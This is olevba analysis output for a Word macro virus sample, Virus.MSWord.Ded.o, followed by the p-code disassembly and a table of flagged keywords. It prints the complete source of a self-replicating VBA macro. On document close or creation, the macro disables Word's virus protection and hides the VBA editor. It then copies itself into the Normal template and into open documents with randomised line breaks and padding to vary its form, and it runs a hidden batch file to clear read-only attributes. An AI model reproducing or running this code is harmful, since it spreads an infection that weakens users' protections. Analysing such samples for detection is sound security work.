olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ded.o
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ded.o - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
     Private Sub Document_Close()
'61,32453
  On _
Error GoTo skam

Options.VirusProtection _
= False

   SWL
'7,746816
           ABS99
'97,70538
skam:
'33,96568
            End _
Sub

              Private Sub _
Идентификатор()

       End Sub
'86,49646
        Private Sub Document_New()
'99,2144
        End _
Sub

   ()
'66,85075
              On _
Error GoTo skam

    Options. _
     VirusProtection = False

 SWL
'7,37747
            ABS99
'19,83387
skam:
'32,99953
   End Sub
'57,16339
    Private Sub SWL()
'33,74245
        Application. _
                         ShowVisualBasicEditor = False

 If _
Not ActiveDocument.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, 1000, 1000, False, False) Then

            For I _
= 1 To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

            d _
= NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

  If _
Len(d) > 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

          While _
Mid(d, Len(d) - 1, 2) = " _"

      I = _
I + 1

              d = _
Left(d, Len(d) - 1) & NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

       Wend
'66,64411
        d _
= e(d)

 ActiveDocument. _
                          VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

   End If
'5,189943
         Next _
I

          ActiveDocument. _
                                           SaveAs AddToRecentFiles:=False

End If
'52,31261
             End _
Sub

            Private Sub ABS99()
'12,28269
             If Not NormalTemplate.VBProject.VBComponents(1).CodeModule.Find("Document_Close", 1, 1, _
1000, 1000, False, False) Then

           f _
(NormalTemplate.FullName)

              For _
I = 1 To ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines

            d = ActiveDocument.VBProject. _
    VBComponents(1).CodeModule.Lines(I, 1)

 If Len(d) _
> 0 And Not d = " " And Not d = " _" And Not d = "" And Not Mid(d, 1, 1) = "'" Then

     While Mid(d, _
Len(d) - 1, 2) = " _"

      I _
= I + 1

         d _
= Left(d, Len(d) - 1) & ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(I, 1)

          Wend
'31,19484
        d = e(d)
'63,67205
NormalTemplate. _
   VBProject.VBComponents(1).CodeModule.InsertLines I * 2, d

            End _
If

 Next I
'71,65875
        NormalTemplate. _
Save

           End _
If

            End Sub
'53,35845
             Private Function e(aString) As String
'67,83416
aString = LTrim(aString)
'38,42444
           aString = RTrim(aString)
'33,28069
 If _
aString = "Sub " & "Vc()" Then

           aString _
= "Sub " & "ViewVBCode()"

  Else
'23,64893
  If aString = "Sub " & "ViewVBCode()" Then
'19,7673
    aString _
= "Sub " & "Vc()"

       End If
'1,76965
            End If
'39,36817
         For _
I = 1 To Len(aString) - 1

  If Mid(aString, _
I, 1) = "." Then

       If _
Not Mid(aString, I - 1, 1) = Chr$(34) And Not Mid(aString, I + 1, 1) = Chr$(34) And Int(3 * Rnd) = 1 Then

              If Not _
Mid(aString, I + 1, 1) = Chr$(34) Then

           e = Left(aString, I _
- 1) & ". _" & Chr$(13) & Right(aString, Len(aString) - I)

         For _
j = 1 To Int(15 * Rnd)

             e = " " & e
'36,53447
Next j
'94,88163
         Exit _
Function

           End _
If

             End If
'14,64869
           Else
'1,532894
If _
Mid(aString, I, 1) = " " And Int(3 * Rnd) = 1 And I > 1 Then

        If Not Mid(aString, I _
+ 1, 1) = Chr$(34) And Not Mid(aString, I - 1, 1) = Chr$(34) Then

    e _
= Left(aString, I - 1) & " _" & Chr$(13) & Right(aString, Len(aString) - I)

   For j = 1 _
To Int(15 * Rnd)

              e = " " & e
'70,12927
   Next j
'74,50183
Exit _
Function

End If
'7,350159
       End If
'21,52658
  End _
If

  Next _
I

         e = aString & Chr$(13) & "'" & (100 * _
Rnd)

         Count = Int(15 _
* Rnd)

     For j = 1 To _
Count

    e _
= " " & e

            Next j
'11,90435
         End Function
'41,34258
         Private Sub _
f(fName)

  If _
GetAttr(fName) And vbReadOnly Then

          Open Dir(fName) _
& ".bat" For Append As #1

            Print _
#1, "Attrib " & "-r " & Chr$(34) & fName & Chr$(34)

      Print _
#1, "del " & Chr$(34) & Dir(fName) & ".bat" & Chr$(34)

              Close _
#1

   shellResult = Shell(Dir(fName) & ".bat", vbHide)
'52,61716
   End _
If

        End _
Sub

  Sub _
ViewVBCode()

  For aDoc = 1 To _
Documents.Count

              For I = _
1 To Documents(aDoc).VBProject.VBComponents(1).CodeModule.CountOfLines

            Documents(aDoc). _
        VBProject.VBComponents(1).CodeModule.DeleteLines 1

           Next I
'41,28224
         Next aDoc
'95,20104
        For I = 1 _
To NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines

        NormalTemplate. _
    VBProject.VBComponents(1).CodeModule.DeleteLines 1

           Next I
'90,71612
   Application. _
    ShowVisualBasicEditor = True

End Sub
'70,91495
      Private Sub Document_Open()
'92,175
   End _
Sub

-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ded.o
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 10613 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Close())
' Line #1:
' 	QuoteRem 0x0000 0x0008 "61,32453"
' Line #2:
' 	LineCont 0x0004 01 00 00 00
' 	OnError skam 
' Line #3:
' Line #4:
' 	LineCont 0x0004 03 00 00 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #5:
' Line #6:
' 	ArgsCall SWL 0x0000 
' Line #7:
' 	QuoteRem 0x0000 0x0008 "7,746816"
' Line #8:
' 	ArgsCall ABS99 0x0000 
' Line #9:
' 	QuoteRem 0x0000 0x0008 "97,70538"
' Line #10:
' 	Label skam 
' Line #11:
' 	QuoteRem 0x0000 0x0008 "33,96568"
' Line #12:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #13:
' Line #14:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub Идентификатор())
' Line #15:
' Line #16:
' 	EndSub 
' Line #17:
' 	QuoteRem 0x0000 0x0008 "86,49646"
' Line #18:
' 	FuncDefn (Private Sub Document_New())
' Line #19:
' 	QuoteRem 0x0000 0x0007 "99,2144"
' Line #20:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #21:
' Line #22:
' 	Reparse 0x0005 "   ()"
' Line #23:
' 	QuoteRem 0x0000 0x0008 "66,85075"
' Line #24:
' 	LineCont 0x0004 01 00 00 00
' 	OnError skam 
' Line #25:
' Line #26:
' 	LineCont 0x0004 02 00 05 00
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #27:
' Line #28:
' 	ArgsCall SWL 0x0000 
' Line #29:
' 	QuoteRem 0x0000 0x0007 "7,37747"
' Line #30:
' 	ArgsCall ABS99 0x0000 
' Line #31:
' 	QuoteRem 0x0000 0x0008 "19,83387"
' Line #32:
' 	Label skam 
' Line #33:
' 	QuoteRem 0x0000 0x0008 "32,99953"
' Line #34:
' 	EndSub 
' Line #35:
' 	QuoteRem 0x0000 0x0008 "57,16339"
' Line #36:
' 	FuncDefn (Private Sub SWL())
' Line #37:
' 	QuoteRem 0x0000 0x0008 "33,74245"
' Line #38:
' 	LineCont 0x0004 02 00 19 00
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #39:
' Line #40:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #41:
' Line #42:
' 	LineCont 0x0004 02 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #43:
' Line #44:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #45:
' Line #46:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #47:
' Line #48:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #49:
' Line #50:
' 	LineCont 0x0004 02 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #51:
' Line #52:
' 	LineCont 0x0004 02 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #53:
' Line #54:
' 	Wend 
' Line #55:
' 	QuoteRem 0x0000 0x0008 "66,64411"
' Line #56:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #57:
' Line #58:
' 	LineCont 0x0004 02 00 1A 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #59:
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	QuoteRem 0x0000 0x0008 "5,189943"
' Line #62:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' Line #64:
' 	LineCont 0x0004 02 00 2B 00
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #65:
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	QuoteRem 0x0000 0x0008 "52,31261"
' Line #68:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #69:
' Line #70:
' 	FuncDefn (Private Sub ABS99())
' Line #71:
' 	QuoteRem 0x0000 0x0008 "12,28269"
' Line #72:
' 	LineCont 0x0004 15 00 00 00
' 	LitStr 0x000E "Document_Close"
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	LitDI2 0x03E8 
' 	LitDI2 0x03E8 
' 	LitVarSpecial (False)
' 	LitVarSpecial (False)
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0007 
' 	Not 
' 	IfBlock 
' Line #73:
' Line #74:
' 	LineCont 0x0004 01 00 00 00
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	Paren 
' 	ArgsCall False 0x0001 
' Line #75:
' Line #76:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #77:
' Line #78:
' 	LineCont 0x0004 06 00 04 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St d 
' Line #79:
' Line #80:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld d 
' 	LitStr 0x0001 " "
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Not 
' 	And 
' 	Ld d 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "'"
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #81:
' Line #82:
' 	LineCont 0x0004 05 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0002 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0002 " _"
' 	Eq 
' 	While 
' Line #83:
' Line #84:
' 	LineCont 0x0004 01 00 00 00
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	St I 
' Line #85:
' Line #86:
' 	LineCont 0x0004 01 00 00 00
' 	Ld d 
' 	Ld d 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	Ld I 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	St d 
' Line #87:
' Line #88:
' 	Wend 
' Line #89:
' 	QuoteRem 0x0000 0x0008 "31,19484"
' Line #90:
' 	Ld d 
' 	ArgsLd e 0x0001 
' 	St d 
' Line #91:
' 	QuoteRem 0x0000 0x0008 "63,67205"
' Line #92:
' 	LineCont 0x0004 02 00 03 00
' 	Ld I 
' 	LitDI2 0x0002 
' 	Mul 
' 	Ld d 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #93:
' Line #94:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #95:
' Line #96:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #97:
' 	QuoteRem 0x0000 0x0008 "71,65875"
' Line #98:
' 	LineCont 0x0004 02 00 00 00
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #99:
' Line #100:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #101:
' Line #102:
' 	EndSub 
' Line #103:
' 	QuoteRem 0x0000 0x0008 "53,35845"
' Line #104:
' 	FuncDefn (Private Function e(aString, id_FFFE As String) As String)
' Line #105:
' 	QuoteRem 0x0000 0x0008 "67,83416"
' Line #106:
' 	Ld aString 
' 	ArgsLd LTrim 0x0001 
' 	St aString 
' Line #107:
' 	QuoteRem 0x0000 0x0008 "38,42444"
' Line #108:
' 	Ld aString 
' 	ArgsLd RTrim 0x0001 
' 	St aString 
' Line #109:
' 	QuoteRem 0x0000 0x0008 "33,28069"
' Line #110:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #111:
' Line #112:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	St aString 
' Line #113:
' Line #114:
' 	ElseBlock 
' Line #115:
' 	QuoteRem 0x0000 0x0008 "23,64893"
' Line #116:
' 	Ld aString 
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x000C "ViewVBCode()"
' 	Concat 
' 	Eq 
' 	IfBlock 
' Line #117:
' 	QuoteRem 0x0000 0x0007 "19,7673"
' Line #118:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0004 "Sub "
' 	LitStr 0x0004 "Vc()"
' 	Concat 
' 	St aString 
' Line #119:
' Line #120:
' 	EndIfBlock 
' Line #121:
' 	QuoteRem 0x0000 0x0007 "1,76965"
' Line #122:
' 	EndIfBlock 
' Line #123:
' 	QuoteRem 0x0000 0x0008 "39,36817"
' Line #124:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aString 
' 	FnLen 
' 	LitDI2 0x0001 
' 	Sub 
' 	For 
' Line #125:
' Line #126:
' 	LineCont 0x0004 05 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	IfBlock 
' Line #127:
' Line #128:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	IfBlock 
' Line #129:
' Line #130:
' 	LineCont 0x0004 02 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	IfBlock 
' Line #131:
' Line #132:
' 	LineCont 0x0004 07 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0003 ". _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #133:
' Line #134:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #135:
' Line #136:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #137:
' 	QuoteRem 0x0000 0x0008 "36,53447"
' Line #138:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #139:
' 	QuoteRem 0x0000 0x0008 "94,88163"
' Line #140:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #141:
' Line #142:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #143:
' Line #144:
' 	EndIfBlock 
' Line #145:
' 	QuoteRem 0x0000 0x0008 "14,64869"
' Line #146:
' 	ElseBlock 
' Line #147:
' 	QuoteRem 0x0000 0x0008 "1,532894"
' Line #148:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 " "
' 	Eq 
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Eq 
' 	And 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Gt 
' 	And 
' 	IfBlock 
' Line #149:
' Line #150:
' 	LineCont 0x0004 07 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Eq 
' 	Not 
' 	And 
' 	IfBlock 
' Line #151:
' Line #152:
' 	LineCont 0x0004 01 00 00 00
' 	Ld aString 
' 	Ld I 
' 	LitDI2 0x0001 
' 	Sub 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0002 " _"
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld aString 
' 	Ld aString 
' 	FnLen 
' 	Ld I 
' 	Sub 
' 	ArgsLd Right 0x0002 
' 	Concat 
' 	St e 
' Line #153:
' Line #154:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	For 
' Line #155:
' Line #156:
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #157:
' 	QuoteRem 0x0000 0x0008 "70,12927"
' Line #158:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' 	QuoteRem 0x0000 0x0008 "74,50183"
' Line #160:
' 	LineCont 0x0004 01 00 00 00
' 	ExitFunc 
' Line #161:
' Line #162:
' 	EndIfBlock 
' Line #163:
' 	QuoteRem 0x0000 0x0008 "7,350159"
' Line #164:
' 	EndIfBlock 
' Line #165:
' 	QuoteRem 0x0000 0x0008 "21,52658"
' Line #166:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #167:
' Line #168:
' 	LineCont 0x0004 01 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #169:
' Line #170:
' 	LineCont 0x0004 0E 00 00 00
' 	Ld aString 
' 	LitDI2 0x000D 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	LitStr 0x0001 "'"
' 	Concat 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	Concat 
' 	St e 
' Line #171:
' Line #172:
' 	LineCont 0x0004 05 00 00 00
' 	LitDI2 0x000F 
' 	Ld Rnd 
' 	Mul 
' 	FnInt 
' 	St Count 
' Line #173:
' Line #174:
' 	LineCont 0x0004 05 00 00 00
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Count 
' 	For 
' Line #175:
' Line #176:
' 	LineCont 0x0004 01 00 00 00
' 	LitStr 0x0001 " "
' 	Ld e 
' 	Concat 
' 	St e 
' Line #177:
' Line #178:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #179:
' 	QuoteRem 0x0000 0x0008 "11,90435"
' Line #180:
' 	EndFunc 
' Line #181:
' 	QuoteRem 0x0000 0x0008 "41,34258"
' Line #182:
' 	LineCont 0x0004 02 00 00 00
' 	FuncDefn (Private Sub False(fName))
' Line #183:
' Line #184:
' 	LineCont 0x0004 01 00 00 00
' 	Ld fName 
' 	ArgsLd GetAttr 0x0001 
' 	Ld vbReadOnly 
' 	And 
' 	IfBlock 
' Line #185:
' Line #186:
' 	LineCont 0x0004 05 00 00 00
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #187:
' Line #188:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "Attrib "
' 	LitStr 0x0003 "-r "
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #189:
' Line #190:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "del "
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	Concat 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	LitDI2 0x0022 
' 	ArgsLd Chr$ 0x0001 
' 	Concat 
' 	PrintItemNL 
' Line #191:
' Line #192:
' 	LineCont 0x0004 01 00 00 00
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #193:
' Line #194:
' 	Ld fName 
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x0004 ".bat"
' 	Concat 
' 	Ld vbHide 
' 	ArgsLd Shell 0x0002 
' 	St shellResult 
' Line #195:
' 	QuoteRem 0x0000 0x0008 "52,61716"
' Line #196:
' 	LineCont 0x0004 01 00 00 00
' 	EndIfBlock 
' Line #197:
' Line #198:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #199:
' Line #200:
' 	LineCont 0x0004 01 00 00 00
' 	FuncDefn (Sub ViewVBCode())
' Line #201:
' Line #202:
' 	LineCont 0x0004 05 00 00 00
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld Documents 
' 	MemLd Count 
' 	For 
' Line #203:
' Line #204:
' 	LineCont 0x0004 03 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #205:
' Line #206:
' 	LineCont 0x0004 05 00 08 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld aDoc 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #207:
' Line #208:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #209:
' 	QuoteRem 0x0000 0x0008 "41,28224"
' Line #210:
' 	StartForVariable 
' 	Ld aDoc 
' 	EndForVariable 
' 	NextVar 
' Line #211:
' 	QuoteRem 0x0000 0x0008 "95,20104"
' Line #212:
' 	LineCont 0x0004 04 00 00 00
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #213:
' Line #214:
' 	LineCont 0x0004 02 00 04 00
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #215:
' Line #216:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #217:
' 	QuoteRem 0x0000 0x0008 "90,71612"
' Line #218:
' 	LineCont 0x0004 02 00 04 00
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #219:
' Line #220:
' 	EndSub 
' Line #221:
' 	QuoteRem 0x0000 0x0008 "70,91495"
' Line #222:
' 	FuncDefn (Private Sub Document_Open())
' Line #223:
' 	QuoteRem 0x0000 0x0006 "92,175"
' Line #224:
' 	LineCont 0x0004 01 00 00 00
' 	EndSub 
' Line #225:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_New        |Runs when a new Word document is created     |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
